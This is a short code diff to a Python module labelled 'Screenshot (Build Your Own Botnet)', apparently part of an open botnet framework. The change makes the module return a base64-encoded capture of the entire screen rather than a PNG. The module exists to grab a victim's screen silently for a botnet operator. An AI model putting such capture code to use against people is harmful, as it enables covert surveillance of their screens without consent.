@@ -2,6 +2,9 @@
 # -*- coding: utf-8 -*-
 'Screenshot (Build Your Own Botnet)'
 
+# standard library
+import base64
+
 # packages
 import mss
 
@@ -27,6 +30,6 @@ def run():
     try:
         with mss.mss() as screen:
             img = screen.grab(screen.monitors[0])
-        return util.png(img)
+        return base64.b64encode(img)
     except Exception as e:
         util.log("{} error: {}".format(run.func_name, str(e)))
